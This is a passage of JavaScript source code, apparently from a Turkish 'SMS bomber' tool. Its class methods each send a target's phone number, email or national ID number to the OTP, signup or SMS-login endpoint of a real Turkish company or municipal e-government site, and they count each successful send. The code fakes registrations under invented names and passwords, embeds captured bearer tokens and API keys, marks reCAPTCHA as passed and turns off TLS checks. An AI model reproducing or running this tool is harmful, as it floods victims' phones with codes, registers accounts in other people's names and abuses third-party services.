      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> app.buyursungelsin.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> app.buyursungelsin.com`);
    }
  }
  async Beefull() {
    try {
      let url = "https://app.beefull.io:443/api/inavitas-access-management/signup";
      let json = { "email": this.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": this.phone, "tenant": "beefull", "username": this.mail };
      await axios.post(url, json, { timeout: 4000 });
      url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login";
      json = { "phoneCode": "90", "phoneNumber": this.phone, "tenant": "beefull" };
      const r = await axios.post(url, json, { timeout: 4000 });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> app.beefull.io`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> app.beefull.io`);
    }
  }
  async Dominos() {
    try {
      const url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode";
      const headers = {
        "Content-Type": "application/json;charset=utf-8",
        "Accept": "application/json, text/plain, */*",
        "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg",
        "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8",
        "Appversion": "IOS-7.1.0",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "tr-TR,tr;q=0.9",
        "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "Servicetype": "CarryOut",
        "Locationcode": "undefined"
      };
      const json = { "email": this.mail, "isSure": false, "mobilePhone": this.phone };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.isSuccess === true) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> frontend.dominos.com.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> frontend.dominos.com.tr`);
    }
  }
  async Baydoner() {
    try {
      const url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp";
      const headers = {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Xsid": "2HB7FQ6G42QL",
        "Dc": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3",
        "Os": "613A408535",
        "Accept-Language": "en-GB,en;q=0.9",
        "Merchantid": "5701",
        "Iskiosk": "0",
        "Sessionid": "",
        "Platform": "1",
        "Appv": "1.6.0",
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": "BaydonerCossla/190 CFNetwork/1335.0.3.4 Darwin/21.6.0"
      };
      const json = {
        "AppVersion": "1.6.0",
        "AreaCode": 90,
        "City": "ADANA",
        "CityId": 1,
        "Code": "",
        "Culture": "tr-TR",
        "DeviceId": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3",
        "DeviceModel": "31",
        "DeviceToken": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3",
        "Email": this.mail,
        "GDPRPolicy": false,
        "Gender": "Kad1n",
        "GenderId": 2,
        "LoyaltyProgram": false,
        "merchantID": 5701,
        "Method": "",
        "Name": "Memati",
        "notificationCode": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g",
        "NotificationToken": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g",
        "OsSystem": "IOS",
        "Password": "31ABC..abc31",
        "PhoneNumber": this.phone,
        "Platform": 1,
        "sessionID": "",
        "socialId": "",
        "SocialMethod": "",
        "Surname": "Bas",
        "TempId": 0,
        "TermsAndConditions": false
      };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.Control === 1) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> crmmobil.baydoner.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> crmmobil.baydoner.com`);
    }
  }
  async Pidem() {
    try {
      const url = "https://restashop.azurewebsites.net:443/graphql/";
      const headers = {
        "Accept": "*/*",
        "Origin": "https://pidem.azurewebsites.net",
        "Content-Type": "application/json",
        "Authorization": "Bearer null",
        "Referer": "https://pidem.azurewebsites.net/",
        "Accept-Language": "tr-TR,tr;q=0.9",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
        "Accept-Encoding": "gzip, deflate, br"
      };
      const json = {
        "query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n",
        "variables": { "phone": this.phone }
      };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.data.sendOtpSms.resultStatus === "SUCCESS") {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> restashop.azurewebsites.net`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> restashop.azurewebsites.net`);
    }
  }
  async Frink() {
    try {
      const url = "https://api.frink.com.tr:443/api/auth/postSendOTP";
      const headers = {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Authorization": "",
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": "Frink/1.6.0 (com.frink.userapp; build:3; iOS 15.8.3) Alamofire/4.9.1",
        "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8",
        "Connection": "keep-alive"
      };
      const json = { "areaCode": "90", "etkContract": true, "language": "TR", "phoneNumber": "90" + this.phone };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.processStatus === "SUCCESS") {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> api.frink.com.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> api.frink.com.tr`);
    }
  }
  async Bodrum() {
    try {
      const url = "https://gandalf.orwi.app:443/api/user/requestOtp";
      const headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en;q=0.9",
        "Token": "",
        "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE",
        "Origin": "capacitor://localhost",
        "Region": "EN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Connection": "keep-alive"
      };
      const json = { "gsm": `+90${this.phone}`, "source": "orwi" };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> gandalf.orwi.app`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> gandalf.orwi.app`);
    }
  }
  async KofteciYusuf() {
    try {
      const url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder";
      const headers = {
        "Content-Type": "application/json; charset=utf-8",
        "Anonymousclientid": "",
        "Accept": "application/json",
        "Ostype": "iOS",
        "Appversion": "4.0.4.0",
        "Accept-Language": "en-GB,en;q=0.9",
        "Firmaid": "82",
        "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq",
        "Accept-Encoding": "gzip, deflate, br",
        "Language": "tr-TR",
        "User-Agent": "YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0"
      };
      const json = { "FireBaseCihazKey": null, "FirmaId": 82, "GuvenlikKodu": null, "Telefon": this.phone };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.Success === true) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> gateway.poskofteciyusuf.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> gateway.poskofteciyusuf.com`);
    }
  }
  async Little() {
    try {
      const url = "https://api.littlecaesars.com.tr:443/api/web/Member/Register";
      const headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json; charset=utf-8",
        "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjM1Zjc4YTFhNjJjNmViODJlNjQ4OTU0M2RmMWQ3MDFhIiwidHlwIjoiSldUIn0.eyJuYmYiOjE3MzkxMTA0NzIsImV4cCI6MTczOTcxNTI3MiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmxpdHRsZWNhZXNhcnMuY29tLnRyIiwiYXVkIjpbImh0dHBzOi8vYXV0aC5saXR0bGVjYWVzYXJzLmNvbS50ci9yZXNvdXJjZXMiLCJsaXR0bGVjYWVzYXJzYXBpIl0sImNsaWVudF9pZCI6IndlYiIsInN1YiI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsImF1dGhfdGltZSI6MTczOTExMDQ3MiwiaWRwIjoibG9jYWwiLCJlbWFpbCI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsInVpZCI6IjI0IiwicGVyc29uaWQiOiIyMDAwNTA4NTU0NjYiLCJuYW1lc3VybmFtZSI6IkxDIER1bW15IiwibGN0b2tlbiI6IlFRcHZHRS1wVDBrZDQ2MjRVQjhUc01SRkxoUUZsUlhGS0toTWYwUlF3U0M4Tnd3M2pzdHd6QzJ3NmNldGRkMkZRdFo1eXpacHVGOE81REhwUWpCSnhKaG5YNVJOcWYyc3NrNHhkTi0zcjZ2T01fdWQzSW5KRDZYUFdSYlM3Tml5d1FHbjByUENxNC1BVE9pd09iR005YnZwUTRISzJhNTFGVTdfQ1R2a2JGUmswMUpwM01YbkJmU3V6OHZ4bTdUTS1Vc1pXZzJDTmVkajlWaXJzdHo2TUs4VXdRTXp6TFZkZHRTQ2lOOENZVWc1cVhBNjVJbEszamVLNnZwQ0EwZTdpem5wa2hKUFVqY1dBc1JLc0tieDB3Y2EycU1EYkl6VlJXdV8xSjF5SDNhWmxSV0w4eFhJYl82NG5jd1p1Yk9MeFpiUFRRZW5GWWxuOGxNY1JFUDFIdTlCOWJyOFd3QVNqMmRDa3g2NVo5S0NPR3FiIiwibGNyZWZyZXNodG9rZW4iOiI2NDUyYWQ4MzIzY2I0N2ZiOWFmMWM2M2EyYWIxMTJkMyIsInBlcnNvbmVtYWlsIjoibGNAZHVtbXkuY29tIiwic2NvcGUiOlsibGl0dGxlY2Flc2Fyc2FwaSIsIm9mZmxpbmVfYWNjZXNzIl0sImFtciI6WyI3NjU2QkFGM0YxNUE2NTA0QkJGM0NFRTgyOTA5MkRGQSJdfQ.SrG2kFdRTVAq0SCt17cmZ-i6Cl9MaQaOUwu1YQ2r27m5_9i5WkVUx_CUPbCNazHcmGt3IYHw9U6TxS-zAz4Jw5o-PbCWktwBiLJNfIsK4akCT4RjX8b7d4YX0yDz4WcIp43ViEsEkDKByHwz75GWdV9gSJtmAerGjZbIoN-OkgJIYAxzCCeGUSdOW2jspvZew9VQKEKVRYzdfZlcvoCV_2mYV122P0jU5i_0J4k_JH-ok7bMxNGqpaxEDSZ1WEuQxBRcXr7C7swcj4AJHHDuksvNrHjXnSjB0VQt5sB3JuwjGDJRuY2yFUlrI8l8W4x01Jm6kSn67G4h8hqyNixpRg",
        "X-Platform": "ios",
        "X-Version": "1.0.0",
        "User-Agent": "LittleCaesars/20 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "Accept-Language": "en-GB,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br"
      };
      const json = { "CampaignInform": true, "Email": this.mail, "InfoRegister": true, "IsLoyaltyApproved": true, "NameSurname": "Memati Bas", "Password": "31ABC..abc31", "Phone": this.phone, "SmsInform": true };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.status === 200 && r.data.status === true) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> api.littlecaesars.com.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> api.littlecaesars.com.tr`);
    }
  }
  async Orwi() {
    try {
      const url = "https://gandalf.orwi.app:443/api/user/requestOtp";
      const headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en;q=0.9",
        "Token": "",
        "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg",
        "Origin": "capacitor://localhost",
        "Region": "EN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Connection": "keep-alive"
      };
      const json = { "gsm": `+90${this.phone}`, "source": "orwi" };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> gandalf.orwi.app`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> gandalf.orwi.app`);
    }
  }
  async Coffy() {
    try {
      const url = "https://user-api-gw.coffy.com.tr:443/user/signup";
      const headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Accept-Language": "en-GB,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Language": "tr",
        "User-Agent": "coffy/5 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkIjoiNjdhOGM0MTc0MDY3ZDFmMzBkMDNmMmRlIiwidSI6IjY3YThjNDE3Njc5YTUxM2MyMzljMDc0YSIsInQiOjE3MzkxMTM0OTUyNjgsImlhdCI6MTczOTExMzQ5NX0.IQ_33PJ8s_CKMbJgp2sD1wIfFO852m5VfIxW-dv2-UA"
      };
      const json = { "countryCode": "90", "gsm": this.phone, "isKVKKAgreementApproved": true, "isUserAgreementApproved": true, "name": "Memati Bas" };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> user-api-gw.coffy.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> user-api-gw.coffy.com`);
    }
  }
  async Hamidiye() {
    try {
      const url = "https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp";
      const headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "com.hamidiyeapp",
        "User-Agent": "hamidiyeapp/4 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "Accept-Language": "en-GB,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
      };
      const json = { "isGuest": false, "phone": this.phone };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.result === true) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> bayi.hamidiye.istanbul`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> bayi.hamidiye.istanbul`);
    }
  }
  async Fatih() {
    try {
      const url = "https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet";
      const headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "multipart/form-data; boundary=----geckoformboundaryc5b24584149b44839fea163e885475be",
        "Origin": "null",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
        "Te": "trailers",
        "Connection": "keep-alive"
      };
      const data = `------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nGKrki1TGUGJ0CBwKd4n5iRulER91aTo-44_PJdfM4_nxAK7aL1f0Ho9UuqG5lya_8RVBGD-j-tNjE93pZnW8RlRyrAEi6ry6uy8SEC20OPY1\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n${this.tc}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n28.12.1999\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\nMemati\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\nBas\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${this.phone}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${this.mail}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.Sifre"\r\n\r\nMemati31\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\nMemati31\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n------geckoformboundaryc5b24584149b44839fea163e885475be--\r\n`;
      const r = await axios.post(url, data, { headers, timeout: 6000, httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false }) });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> ebelediye.fatih.bel.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> ebelediye.fatih.bel.tr`);
    }
  }
  async Sancaktepe() {
    try {
      const url = "https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet";
      const headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "multipart/form-data; boundary=----geckoformboundary35479e29ca6a61a4a039e2d3ca87f112",
        "Origin": "null",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
        "Te": "trailers",
        "Connection": "keep-alive"
      };
      const data = `------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\n21z_svqlZXLTEPZGuSugh8winOg_nSRis6rOL-96TmwGUHExtulBBRN9F2XBS_LvU28OyUsfMVdZQmeJlejCYZ1slOmqI63OX_FsQhCxwGk1\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n${this.tc}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n13.01.2000\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\nMEMATİ\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\nBAS\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${this.phone}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${this.mail}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.Sifre"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112--\r\n`;
      const r = await axios.post(url, data, { headers, timeout: 6000, httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false }) });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> e-belediye.sancaktepe.bel.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> e-belediye.sancaktepe.bel.tr`);
    }
  }
  async Bayrampasa() {
    try {
      const url = "https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet";
      const headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "multipart/form-data; boundary=----geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b",
        "Origin": "null",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
        "Te": "trailers"
      };
      const data = `------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nzOIiDXRlsw-KfS3JGnn-Vxdl5UP-ZNzjaA207_Az-5FfpsusGnNUxonzDkvoZ55Cszn3beOwk80WczRsSfazSZVxqMU0mMkO70gOe8BlbSg1\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n${this.tc}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n07.06.2000\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\nMEMATİ\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\nBAS\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${this.phone}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${this.mail}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.Sifre"\r\n\r\nMemati31\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\nMemati31\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b--\r\n`;
      const r = await axios.post(url, data, { headers, timeout: 6000, httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false }) });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> ebelediye.bayrampasa.bel.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> ebelediye.bayrampasa.bel.tr`);
    }
  }
  async Money() {
    try {
      const url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP";
      const headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://www.money.com.tr/money-kartiniz-var-mi",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://www.money.com.tr",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0",
        "Te": "trailers",
        "Connection": "keep-alive"
      };
      const data = { "phone": `${this.phone.substring(0,3)} ${this.phone.substring(3,10)}`, "GRecaptchaResponse": '' };
      const r = await axios.post(url, new URLSearchParams(data), { headers, timeout: 6000 });
      if (r.data.resultType === 0) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> money.com.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> money.com.tr`);
    }
  }
  async Alixavien() {
    try {
      const url = "https://www.alixavien.com.tr:443/api/member/sendOtp";
      const headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Accept": "*/*",
        "Referer": "https://www.alixavien.com.tr/UyeOl?srsltid=AfmBOoqrh4xzegqOPllnfc_4S0akofArgwZUErwoeOJzrqU16J1zksPj",
        "Content-Type": "application/json",
        "Origin": "https://www.alixavien.com.tr",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0",
        "Te": "trailers"
      };
      const json = { "Phone": this.phone, "XID": "" };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.isError === false) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> alixavien.com.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> alixavien.com.tr`);
    }
  }
  async Jimmykey() {
    try {
      const r = await axios.post(`https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm=${this.phone}&gRecaptchaResponse=undefined`, {}, { timeout: 6000 });
      if (r.data.Sonuc === true) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> jimmykey.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> jimmykey.com`);
    }
  }
